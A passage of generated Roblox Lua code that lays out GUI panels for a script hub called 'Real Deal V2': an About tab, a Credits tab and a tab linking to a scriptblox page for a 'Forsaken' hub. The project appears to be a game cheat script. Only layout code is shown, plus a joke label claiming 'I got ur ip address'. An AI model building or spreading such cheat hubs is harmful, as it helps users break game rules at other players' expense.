G2L["107"]["Size"] = UDim2.new(0.99982, 0, 0.85028, 0);
G2L["107"]["Position"] = UDim2.new(0, 0, 0.08711, 0);
G2L["107"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["107"]["Name"] = [[About]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.LocalScript
G2L["108"] = Instance.new("LocalScript", G2L["107"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.PlrIcon
G2L["109"] = Instance.new("ImageLabel", G2L["107"]);
G2L["109"]["BorderSizePixel"] = 0;
G2L["109"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["109"]["BackgroundColor3"] = Color3.fromRGB(120, 255, 47);
G2L["109"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["109"]["Size"] = UDim2.new(0.17921, 0, 0.17829, 0);
G2L["109"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["109"]["Name"] = [[PlrIcon]];
G2L["109"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.PlrIcon.TextLabel
G2L["10a"] = Instance.new("TextLabel", G2L["109"]);
G2L["10a"]["TextWrapped"] = true;
G2L["10a"]["BorderSizePixel"] = 0;
G2L["10a"]["TextSize"] = 14;
G2L["10a"]["TextScaled"] = true;
G2L["10a"]["BackgroundColor3"] = Color3.fromRGB(120, 255, 47);
G2L["10a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10a"]["Size"] = UDim2.new(4.56716, 0, 0.74627, 0);
G2L["10a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10a"]["Text"] = [[--Player Name if it didnt load BOOHOO]];
G2L["10a"]["Position"] = UDim2.new(1, 0, 0.25373, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.PlrIcon.TextLabel.UICorner
G2L["10b"] = Instance.new("UICorner", G2L["10a"]);
G2L["10b"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.PlrIcon.UICorner
G2L["10c"] = Instance.new("UICorner", G2L["109"]);
G2L["10c"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info
G2L["10d"] = Instance.new("TextLabel", G2L["107"]);
G2L["10d"]["TextWrapped"] = true;
G2L["10d"]["BorderSizePixel"] = 0;
G2L["10d"]["TextSize"] = 14;
G2L["10d"]["TextScaled"] = true;
G2L["10d"]["BackgroundColor3"] = Color3.fromRGB(120, 255, 47);
G2L["10d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10d"]["Size"] = UDim2.new(0.99768, 0, 0.07185, 0);
G2L["10d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10d"]["Text"] = [[Server INFO]];
G2L["10d"]["Name"] = [[Server Info]];
G2L["10d"]["Position"] = UDim2.new(-0, 0, 0.23683, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.ServerAge
G2L["10e"] = Instance.new("TextLabel", G2L["10d"]);
G2L["10e"]["TextWrapped"] = true;
G2L["10e"]["BorderSizePixel"] = 0;
G2L["10e"]["TextSize"] = 14;
G2L["10e"]["TextScaled"] = true;
G2L["10e"]["BackgroundColor3"] = Color3.fromRGB(120, 255, 47);
G2L["10e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10e"]["Size"] = UDim2.new(0.17694, 0, 1.07407, 0);
G2L["10e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10e"]["Text"] = [[Running Script Since]];
G2L["10e"]["Name"] = [[ServerAge]];
G2L["10e"]["Position"] = UDim2.new(0, 0, 1, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.ServerAge.TextLabel
G2L["10f"] = Instance.new("TextLabel", G2L["10e"]);
G2L["10f"]["TextWrapped"] = true;
G2L["10f"]["ZIndex"] = 123;
G2L["10f"]["BorderSizePixel"] = 0;
G2L["10f"]["TextSize"] = 14;
G2L["10f"]["TextScaled"] = true;
G2L["10f"]["BackgroundColor3"] = Color3.fromRGB(120, 255, 47);
G2L["10f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10f"]["Size"] = UDim2.new(4.65152, 0, 1, 0);
G2L["10f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10f"]["Text"] = [[--:--:--:--]];
G2L["10f"]["Position"] = UDim2.new(1.01028, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.ServerAge.TextLabel.UICorner
G2L["110"] = Instance.new("UICorner", G2L["10f"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.ServerAge.UICorner
G2L["111"] = Instance.new("UICorner", G2L["10e"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.Date
G2L["112"] = Instance.new("TextLabel", G2L["10d"]);
G2L["112"]["TextWrapped"] = true;
G2L["112"]["BorderSizePixel"] = 0;
G2L["112"]["TextSize"] = 14;
G2L["112"]["TextScaled"] = true;
G2L["112"]["BackgroundColor3"] = Color3.fromRGB(120, 255, 47);
G2L["112"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["112"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["112"]["Size"] = UDim2.new(0.17962, 0, 0.88889, 0);
G2L["112"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["112"]["Text"] = [[Date:-]];
G2L["112"]["Name"] = [[Date]];
G2L["112"]["Position"] = UDim2.new(-0.00535, 0, 2.05252, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.Date.Date
G2L["113"] = Instance.new("TextLabel", G2L["112"]);
G2L["113"]["TextWrapped"] = true;
G2L["113"]["BorderSizePixel"] = 0;
G2L["113"]["TextSize"] = 14;
G2L["113"]["TextScaled"] = true;
G2L["113"]["BackgroundColor3"] = Color3.fromRGB(120, 255, 47);
G2L["113"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["113"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["113"]["Size"] = UDim2.new(4.59701, 0, 1, 0);
G2L["113"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["113"]["Text"] = [[--]];
G2L["113"]["Name"] = [[Date]];
G2L["113"]["Position"] = UDim2.new(1.00957, 0, -0.03082, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.Date.Date.UICorner
G2L["114"] = Instance.new("UICorner", G2L["113"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.Date.UICorner
G2L["115"] = Instance.new("UICorner", G2L["112"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.LocalTime
G2L["116"] = Instance.new("TextLabel", G2L["10d"]);
G2L["116"]["TextWrapped"] = true;
G2L["116"]["BorderSizePixel"] = 0;
G2L["116"]["TextSize"] = 14;
G2L["116"]["TextScaled"] = true;
G2L["116"]["BackgroundColor3"] = Color3.fromRGB(120, 255, 47);
G2L["116"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["116"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["116"]["Size"] = UDim2.new(0.17962, 0, 0.88889, 0);
G2L["116"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["116"]["Text"] = [[Local Time]];
G2L["116"]["Name"] = [[LocalTime]];
G2L["116"]["Position"] = UDim2.new(-0.00535, 0, 2.90437, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.LocalTime.LocalTime
G2L["117"] = Instance.new("TextLabel", G2L["116"]);
G2L["117"]["TextWrapped"] = true;
G2L["117"]["BorderSizePixel"] = 0;
G2L["117"]["TextSize"] = 14;
G2L["117"]["TextScaled"] = true;
G2L["117"]["BackgroundColor3"] = Color3.fromRGB(120, 255, 47);
G2L["117"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["117"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Size"] = UDim2.new(4.59701, 0, 1, 0);
G2L["117"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Text"] = [[--I got ur ip address--]];
G2L["117"]["Name"] = [[LocalTime]];
G2L["117"]["Position"] = UDim2.new(1.00957, 0, 0.01085, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.LocalTime.LocalTime.UICorner
G2L["118"] = Instance.new("UICorner", G2L["117"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.LocalTime.UICorner
G2L["119"] = Instance.new("UICorner", G2L["116"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Server Info.UICorner
G2L["11a"] = Instance.new("UICorner", G2L["10d"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame
G2L["11b"] = Instance.new("Frame", G2L["107"]);
G2L["11b"]["BorderSizePixel"] = 0;
G2L["11b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11b"]["Size"] = UDim2.new(1.00398, 0, 0.49136, 0);
G2L["11b"]["Position"] = UDim2.new(0, 0, 0.50966, 0);
G2L["11b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11b"]["BackgroundTransparency"] = 1;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel
G2L["11c"] = Instance.new("TextLabel", G2L["11b"]);
G2L["11c"]["TextWrapped"] = true;
G2L["11c"]["BorderSizePixel"] = 0;
G2L["11c"]["TextSize"] = 14;
G2L["11c"]["TextScaled"] = true;
G2L["11c"]["BackgroundColor3"] = Color3.fromRGB(255, 203, 43);
G2L["11c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11c"]["Size"] = UDim2.new(0.53763, 0, 0.27322, 0);
G2L["11c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11c"]["Text"] = [[BACKGROUND COLOR]];
G2L["11c"]["Position"] = UDim2.new(0.23118, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.Red
G2L["11d"] = Instance.new("TextLabel", G2L["11c"]);
G2L["11d"]["TextWrapped"] = true;
G2L["11d"]["BorderSizePixel"] = 0;
G2L["11d"]["TextSize"] = 14;
G2L["11d"]["TextScaled"] = true;
G2L["11d"]["BackgroundColor3"] = Color3.fromRGB(255, 203, 43);
G2L["11d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11d"]["BackgroundTransparency"] = 1;
G2L["11d"]["Size"] = UDim2.new(0.25, 0, 0.78, 0);
G2L["11d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11d"]["Text"] = [[R]];
G2L["11d"]["Name"] = [[Red]];
G2L["11d"]["Position"] = UDim2.new(-0.10851, 0, 0.88, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.Red.TextBox
G2L["11e"] = Instance.new("TextBox", G2L["11d"]);
G2L["11e"]["BorderSizePixel"] = 0;
G2L["11e"]["TextWrapped"] = true;
G2L["11e"]["TextSize"] = 14;
G2L["11e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11e"]["TextScaled"] = true;
G2L["11e"]["BackgroundColor3"] = Color3.fromRGB(255, 203, 43);
G2L["11e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11e"]["Size"] = UDim2.new(1, 0, 1.28205, 0);
G2L["11e"]["Position"] = UDim2.new(0, 0, 0.98615, 0);
G2L["11e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11e"]["Text"] = [[27]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.Red.TextBox.UICorner
G2L["11f"] = Instance.new("UICorner", G2L["11e"]);
G2L["11f"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.Green
G2L["120"] = Instance.new("TextLabel", G2L["11c"]);
G2L["120"]["TextWrapped"] = true;
G2L["120"]["BorderSizePixel"] = 0;
G2L["120"]["TextSize"] = 14;
G2L["120"]["TextScaled"] = true;
G2L["120"]["BackgroundColor3"] = Color3.fromRGB(255, 203, 43);
G2L["120"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["120"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["120"]["BackgroundTransparency"] = 1;
G2L["120"]["Size"] = UDim2.new(0.56, 0, 0.78, 0);
G2L["120"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["120"]["Text"] = [[G]];
G2L["120"]["Name"] = [[Green]];
G2L["120"]["Position"] = UDim2.new(0.235, 0, 0.88, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.Green.TextBox
G2L["121"] = Instance.new("TextBox", G2L["120"]);
G2L["121"]["BorderSizePixel"] = 0;
G2L["121"]["TextWrapped"] = true;
G2L["121"]["TextSize"] = 14;
G2L["121"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["121"]["TextScaled"] = true;
G2L["121"]["BackgroundColor3"] = Color3.fromRGB(255, 203, 43);
G2L["121"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["121"]["Size"] = UDim2.new(0.44643, 0, 1.28205, 0);
G2L["121"]["Position"] = UDim2.new(0.27679, 0, 0.98615, 0);
G2L["121"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["121"]["Text"] = [[137]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.Green.TextBox.UICorner
G2L["122"] = Instance.new("UICorner", G2L["121"]);
G2L["122"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.Blue
G2L["123"] = Instance.new("TextLabel", G2L["11c"]);
G2L["123"]["TextWrapped"] = true;
G2L["123"]["BorderSizePixel"] = 0;
G2L["123"]["TextSize"] = 14;
G2L["123"]["TextScaled"] = true;
G2L["123"]["BackgroundColor3"] = Color3.fromRGB(255, 203, 43);
G2L["123"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["123"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["123"]["BackgroundTransparency"] = 1;
G2L["123"]["Size"] = UDim2.new(0.315, 0, 0.78, 0);
G2L["123"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["123"]["Text"] = [[B]];
G2L["123"]["Name"] = [[Blue]];
G2L["123"]["Position"] = UDim2.new(0.905, 0, 0.88, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.Blue.TextBox
G2L["124"] = Instance.new("TextBox", G2L["123"]);
G2L["124"]["BorderSizePixel"] = 0;
G2L["124"]["TextWrapped"] = true;
G2L["124"]["TextSize"] = 14;
G2L["124"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["124"]["TextScaled"] = true;
G2L["124"]["BackgroundColor3"] = Color3.fromRGB(255, 203, 43);
G2L["124"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["124"]["Size"] = UDim2.new(0.79365, 0, 1.28205, 0);
G2L["124"]["Position"] = UDim2.new(0.09738, 0, 0.98615, 0);
G2L["124"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["124"]["Text"] = [[147]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.Blue.TextBox.UICorner
G2L["125"] = Instance.new("UICorner", G2L["124"]);
G2L["125"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.TextButton
G2L["126"] = Instance.new("TextButton", G2L["11c"]);
G2L["126"]["TextWrapped"] = true;
G2L["126"]["BorderSizePixel"] = 0;
G2L["126"]["TextSize"] = 14;
G2L["126"]["TextScaled"] = true;
G2L["126"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["126"]["BackgroundColor3"] = Color3.fromRGB(255, 203, 43);
G2L["126"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["126"]["Size"] = UDim2.new(1.02342, 0, 0.69593, 0);
G2L["126"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["126"]["Text"] = [[PRESS ME AFTER]];
G2L["126"]["Position"] = UDim2.new(0.015, 0, 2.82, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.TextButton.LocalScript
G2L["127"] = Instance.new("LocalScript", G2L["126"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.TextButton.UICorner
G2L["128"] = Instance.new("UICorner", G2L["126"]);
G2L["128"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.UICorner
G2L["129"] = Instance.new("UICorner", G2L["11c"]);
G2L["129"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits
G2L["12a"] = Instance.new("Frame", G2L["6b"]);
G2L["12a"]["Visible"] = false;
G2L["12a"]["BorderSizePixel"] = 0;
G2L["12a"]["BackgroundColor3"] = Color3.fromRGB(28, 138, 148);
G2L["12a"]["Size"] = UDim2.new(0.99982, 0, 0.85028, 0);
G2L["12a"]["Position"] = UDim2.new(0, 0, 0.08711, 0);
G2L["12a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12a"]["Name"] = [[Credits]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel
G2L["12b"] = Instance.new("TextLabel", G2L["12a"]);
G2L["12b"]["TextWrapped"] = true;
G2L["12b"]["BorderSizePixel"] = 0;
G2L["12b"]["TextSize"] = 14;
G2L["12b"]["TextScaled"] = true;
G2L["12b"]["BackgroundColor3"] = Color3.fromRGB(110, 110, 110);
G2L["12b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12b"]["Size"] = UDim2.new(0.6238, 0, 0.12102, 0);
G2L["12b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12b"]["Text"] = [[Credits To:]];
G2L["12b"]["Position"] = UDim2.new(0.18402, 0, 0.02172, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.TextLabel
G2L["12c"] = Instance.new("TextLabel", G2L["12b"]);
G2L["12c"]["TextWrapped"] = true;
G2L["12c"]["ZIndex"] = 2;
G2L["12c"]["BorderSizePixel"] = 0;
G2L["12c"]["TextSize"] = 14;
G2L["12c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12c"]["TextScaled"] = true;
G2L["12c"]["BackgroundColor3"] = Color3.fromRGB(110, 110, 110);
G2L["12c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12c"]["BackgroundTransparency"] = 1;
G2L["12c"]["Size"] = UDim2.new(1.47838, 0, 1.00015, 0);
G2L["12c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12c"]["Text"] = [[1.SeaKarate(Creator)]];
G2L["12c"]["Position"] = UDim2.new(-0.23, 0, 1.25, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.TextLabel
G2L["12d"] = Instance.new("TextLabel", G2L["12b"]);
G2L["12d"]["TextWrapped"] = true;
G2L["12d"]["ZIndex"] = 2;
G2L["12d"]["BorderSizePixel"] = 0;
G2L["12d"]["TextSize"] = 14;
G2L["12d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12d"]["TextScaled"] = true;
G2L["12d"]["BackgroundColor3"] = Color3.fromRGB(110, 110, 110);
G2L["12d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12d"]["BackgroundTransparency"] = 1;
G2L["12d"]["Size"] = UDim2.new(1.47838, 0, 1.00015, 0);
G2L["12d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12d"]["Text"] = [[2.HelloDoors100(My Alt)]];
G2L["12d"]["Position"] = UDim2.new(-0.23, 0, 2.25015, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.TextLabel
G2L["12e"] = Instance.new("TextLabel", G2L["12b"]);
G2L["12e"]["TextWrapped"] = true;
G2L["12e"]["ZIndex"] = 2;
G2L["12e"]["BorderSizePixel"] = 0;
G2L["12e"]["TextSize"] = 14;
G2L["12e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12e"]["TextScaled"] = true;
G2L["12e"]["BackgroundColor3"] = Color3.fromRGB(110, 110, 110);
G2L["12e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12e"]["BackgroundTransparency"] = 1;
G2L["12e"]["Size"] = UDim2.new(1.47838, 0, 1.00015, 0);
G2L["12e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12e"]["Text"] = [[3.HelloDoors101(My Alt)]];
G2L["12e"]["Position"] = UDim2.new(-0.23, 0, 3.2503, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.TextLabel
G2L["12f"] = Instance.new("TextLabel", G2L["12b"]);
G2L["12f"]["TextWrapped"] = true;
G2L["12f"]["ZIndex"] = 2;
G2L["12f"]["BorderSizePixel"] = 0;
G2L["12f"]["TextSize"] = 14;
G2L["12f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12f"]["TextScaled"] = true;
G2L["12f"]["BackgroundColor3"] = Color3.fromRGB(110, 110, 110);
G2L["12f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12f"]["BackgroundTransparency"] = 1;
G2L["12f"]["Size"] = UDim2.new(1.47838, 0, 1.00015, 0);
G2L["12f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12f"]["Text"] = [[4.HelloDoors1029(My Alt)]];
G2L["12f"]["Position"] = UDim2.new(-0.23, 0, 4.25046, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.TextLabel
G2L["130"] = Instance.new("TextLabel", G2L["12b"]);
G2L["130"]["TextWrapped"] = true;
G2L["130"]["ZIndex"] = 2;
G2L["130"]["BorderSizePixel"] = 0;
G2L["130"]["TextSize"] = 14;
G2L["130"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["130"]["TextScaled"] = true;
G2L["130"]["BackgroundColor3"] = Color3.fromRGB(110, 110, 110);
G2L["130"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["130"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["130"]["BackgroundTransparency"] = 1;
G2L["130"]["Size"] = UDim2.new(1.47838, 0, 1.00015, 0);
G2L["130"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["130"]["Text"] = [[5.HelloDoors103(My Alt)]];
G2L["130"]["Position"] = UDim2.new(-0.23, 0, 5.25061, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.TextLabel
G2L["131"] = Instance.new("TextLabel", G2L["12b"]);
G2L["131"]["TextWrapped"] = true;
G2L["131"]["ZIndex"] = 2;
G2L["131"]["BorderSizePixel"] = 0;
G2L["131"]["TextSize"] = 14;
G2L["131"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["131"]["TextScaled"] = true;
G2L["131"]["BackgroundColor3"] = Color3.fromRGB(110, 110, 110);
G2L["131"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["131"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["131"]["BackgroundTransparency"] = 1;
G2L["131"]["Size"] = UDim2.new(1.47838, 0, 1.00015, 0);
G2L["131"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["131"]["Text"] = [[6.HelloDoors104(My Alt)]];
G2L["131"]["Position"] = UDim2.new(-0.23, 0, 6.25076, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.UICorner
G2L["132"] = Instance.new("UICorner", G2L["12b"]);
G2L["132"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.UIStroke
G2L["133"] = Instance.new("UIStroke", G2L["12b"]);
G2L["133"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.Frame
G2L["134"] = Instance.new("Frame", G2L["12b"]);
G2L["134"]["BorderSizePixel"] = 0;
G2L["134"]["BackgroundColor3"] = Color3.fromRGB(110, 110, 110);
G2L["134"]["Size"] = UDim2.new(1.54903, 0, 6.00092, 0);
G2L["134"]["Position"] = UDim2.new(-0.265, 0, 1.25, 0);
G2L["134"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.Frame.UICorner
G2L["135"] = Instance.new("UICorner", G2L["134"]);
G2L["135"]["CornerRadius"] = UDim.new(0, 30);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Credits.TextLabel.Frame.UIStroke
G2L["136"] = Instance.new("UIStroke", G2L["134"]);
G2L["136"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.STOPSKIDDIN
G2L["137"] = Instance.new("Frame", G2L["6b"]);
G2L["137"]["Visible"] = false;
G2L["137"]["BorderSizePixel"] = 0;
G2L["137"]["BackgroundColor3"] = Color3.fromRGB(28, 138, 148);
G2L["137"]["Size"] = UDim2.new(0.99982, 0, 0.85028, 0);
G2L["137"]["Position"] = UDim2.new(0, 0, 0.08711, 0);
G2L["137"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["137"]["Name"] = [[STOPSKIDDIN]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.STOPSKIDDIN.TextLabel
G2L["138"] = Instance.new("TextLabel", G2L["137"]);
G2L["138"]["TextWrapped"] = true;
G2L["138"]["BorderSizePixel"] = 0;
G2L["138"]["TextSize"] = 30;
G2L["138"]["TextScaled"] = true;
G2L["138"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["138"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["138"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["138"]["BackgroundTransparency"] = 1;
G2L["138"]["Size"] = UDim2.new(0.99829, 0, 0.38608, 0);
G2L["138"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["138"]["Text"] = [[OFFICIAL LINK https://scriptblox.com /script/Forsaken- Bugsaken-Hub-65398]];
G2L["138"]["Position"] = UDim2.new(0, 0, 0, 0);


